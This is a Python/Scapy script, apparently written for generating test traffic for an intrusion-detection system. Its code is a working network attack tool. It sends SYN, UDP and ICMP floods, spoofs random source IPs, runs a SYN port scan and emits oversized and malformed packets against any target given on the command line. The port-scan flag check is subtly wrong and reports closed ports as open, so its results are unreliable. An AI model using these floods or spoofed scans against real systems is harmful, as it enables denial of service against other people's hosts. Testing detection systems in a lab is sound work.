#!/usr/bin/env python3
"""
generate_anomalies.py

Simple toolkit to generate synthetic anomalous traffic to test a packet sniffer / IDS.

Usage examples:
  # SYN flood of 500 packets to localhost at 200 pkt/s
  sudo python3 generate_anomalies.py --target 127.0.0.1 --syn-flood --count 500 --rate 200

  # UDP flood with payloads
  sudo python3 generate_anomalies.py --target 127.0.0.1 --udp-flood --count 300 --rate 150

  # Port scan (TCP SYN) across ports 75-90
  sudo python3 generate_anomalies.py --target 127.0.0.1 --port-scan --ports 75-90

  # Run multiple tests sequentially
  sudo python3 generate_anomalies.py --target 127.0.0.1 --syn-flood --udp-flood --port-scan --count 200

IMPORTANT SAFETY:
 - Run only on lab machines, VMs, containers, or localhost.
 - Many operations require root/administrator privileges (packet crafting, spoofing).
 - Spoofing source IPs may be blocked by your OS/network. On Windows some features are limited.
"""

import argparse
import random
import time
import logging
from scapy.all import IP, TCP, UDP, ICMP, Raw, send, sendp, sr1, conf

# Suppress Scapy warnings and verbose output
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
conf.verb = 0

def pace_loop(total, rate):
    """Yield pacing intervals to attempt to meet 'rate' packets/sec."""
    if rate is None or rate <= 0:
        for _ in range(total):
            yield
        return
    interval = 1.0 / rate
    next_time = time.perf_counter()
    for _ in range(total):
        now = time.perf_counter()
        if now < next_time:
            time.sleep(next_time - now)
        yield
        next_time += interval

def random_ipv4():
    # Avoid generating multicast/0/255 addresses; generate private-ish addresses for lab
    return "192.168.{}.{:d}".format(random.randint(0, 255), random.randint(2, 254))

def syn_flood(target, dport=80, count=200, rate=1000, spoof=False):
    """Send many TCP SYN packets to target:dport."""
    print(f"[SYN flood] target={target}:{dport}, count={count}, rate={rate}, spoof={spoof}")
    for _ in pace_loop(count, rate):
        src_ip = random_ipv4() if spoof else None
        sport = random.randint(1024, 65535)
        ip = IP(dst=target) if not src_ip else IP(src=src_ip, dst=target)
        pkt = ip / TCP(sport=sport, dport=dport, flags="S", seq=random.randint(0, 0xFFFFFFFF))
        send(pkt, verbose=False)

def udp_flood(target, dport=5000, count=200, rate=1000, payload_size=100, spoof=False):
    """Send many UDP packets with a payload."""
    print(f"[UDP flood] target={target}:{dport}, count={count}, rate={rate}, payload={payload_size}, spoof={spoof}")
    for _ in pace_loop(count, rate):
        src_ip = random_ipv4() if spoof else None
        sport = random.randint(1024, 65535)
        data = bytes(random.getrandbits(8) for _ in range(payload_size))
        ip = IP(dst=target) if not src_ip else IP(src=src_ip, dst=target)
        pkt = ip / UDP(sport=sport, dport=dport) / Raw(load=data)
        send(pkt, verbose=False)

def icmp_flood(target, count=200, rate=1000):
    """High-rate ICMP echo requests (ping flood)."""
    print(f"[ICMP flood] target={target}, count={count}, rate={rate}")
    for _ in pace_loop(count, rate):
        pkt = IP(dst=target) / ICMP()
        send(pkt, verbose=False)

def large_payload(target, dport=12345, count=10, rate=1):
    """Send a few packets with unusually large payloads."""
    print(f"[Large payload] target={target}:{dport}, count={count}")
    for _ in pace_loop(count, rate):
        data = b"A" * 60000  # large payload (may be fragmented)
        pkt = IP(dst=target) / UDP(dport=dport) / Raw(load=data)
        send(pkt, verbose=False)

def port_scan(target, ports="1-1024", timeout=0.5, spoof=False):
    """TCP SYN port scan. Ports can be range '100-200' or comma-separated '22,80,443'."""
    print(f"[Port scan] target={target}, ports={ports}, spoof={spoof}")
    ports_list = []
    if "-" in ports:
        a, b = ports.split("-")
        ports_list = list(range(int(a), int(b) + 1))
    elif "," in ports:
        ports_list = [int(p.strip()) for p in ports.split(",")]
    else:
        ports_list = [int(ports)]
    for p in ports_list:
        src_ip = random_ipv4() if spoof else None
        ip = IP(dst=target) if not src_ip else IP(src=src_ip, dst=target)
        pkt = ip / TCP(dport=p, flags="S")
        # sr1 waits for a reply; timeout short to keep scan fast
        resp = sr1(pkt, timeout=timeout, verbose=False)
        if resp is None:
            print(f"Port {p}: no response")
        else:
            # check TCP flags in response (SYN-ACK => open)
            if resp.haslayer(TCP):
                flags = resp.getlayer(TCP).flags
                if flags & 0x12:  # SYN+ACK
                    print(f"Port {p}: OPEN (SYN-ACK)")
                elif flags & 0x14:  # RST
                    print(f"Port {p}: CLOSED (RST)")

def malformed_packets(target, count=20, rate=10):
    """Send weird/malformed packets (e.g., invalid flags, wrong checksums)."""
    print(f"[Malformed] target={target}, count={count}")
    for _ in pace_loop(count, rate):
        # craft a packet with inconsistent header fields
        ip = IP(dst=target, ihl=2)  # deliberately too-small header length
        pkt = ip / TCP(dport=80, flags="A") / Raw(load=b"\x00\xFF\x00")
        send(pkt, verbose=False)

def main():
    parser = argparse.ArgumentParser(description="Generate synthetic anomalous traffic (lab use only).")
    parser.add_argument("--target", required=True, help="Target IP or hostname (use 127.0.0.1 for local tests).")
    parser.add_argument("--syn-flood", action="store_true")
    parser.add_argument("--udp-flood", action="store_true")
    parser.add_argument("--icmp-flood", action="store_true")
    parser.add_argument("--large-payload", action="store_true")
    parser.add_argument("--port-scan", action="store_true")
    parser.add_argument("--malformed", action="store_true")

    parser.add_argument("--dport", type=int, default=80, help="Destination port for floods")
    parser.add_argument("--count", type=int, default=200, help="Number of packets (per attack type)")
    parser.add_argument("--rate", type=float, default=500.0, help="Rate (packets per second)")
    parser.add_argument("--payload", type=int, default=200, help="Payload size for UDP flood")
    parser.add_argument("--ports", type=str, default="1-1024", help="Ports range or list used by port scan")
    parser.add_argument("--spoof", action="store_true", help="Spoof random source IPs (requires privileges and may be blocked)")
    args = parser.parse_args()

    target = args.target

    # Run selected attacks sequentially
    if args.syn_flood:
        syn_flood(target, dport=args.dport, count=args.count, rate=args.rate, spoof=args.spoof)
        time.sleep(1)

    if args.udp_flood:
        udp_flood(target, dport=args.dport, count=args.count, rate=args.rate, payload_size=args.payload, spoof=args.spoof)
        time.sleep(1)

    if args.icmp_flood:
        icmp_flood(target, count=args.count, rate=args.rate)
        time.sleep(1)

    if args.port_scan:
        port_scan(target, ports=args.ports, spoof=args.spoof)
        time.sleep(1)

    if args.large_payload:
        large_payload(target, dport=args.dport, count=10, rate=0.5)
        time.sleep(1)

    if args.malformed:
        malformed_packets(target, count=args.count, rate=max(1, args.rate/100))

    print("[done] attacks finished (or completed selection).")

if __name__ == "__main__":
    import argparse
    main()

